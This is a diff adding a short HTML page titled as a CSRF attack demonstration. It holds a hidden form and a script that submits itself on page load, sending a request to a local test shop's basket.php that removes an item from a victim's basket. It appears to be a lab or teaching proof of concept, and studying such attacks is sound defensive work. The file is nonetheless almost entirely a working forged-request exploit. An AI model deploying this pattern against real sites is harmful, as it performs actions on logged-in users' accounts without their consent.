@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack Demonstration</h1>
+    <!-- Automatically triggers the action -->
+    <form action="http://old-web-shop.local/basket.php" method="GET">
+        <!-- Specify the name of the item to remove -->
+        <input type="hidden" name="remove" value="Hoodie">
+        <input type="submit" value="Execute Attack">
+    </form>
+
+    <script>
+        // Automatically submit the form to simulate the attack
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
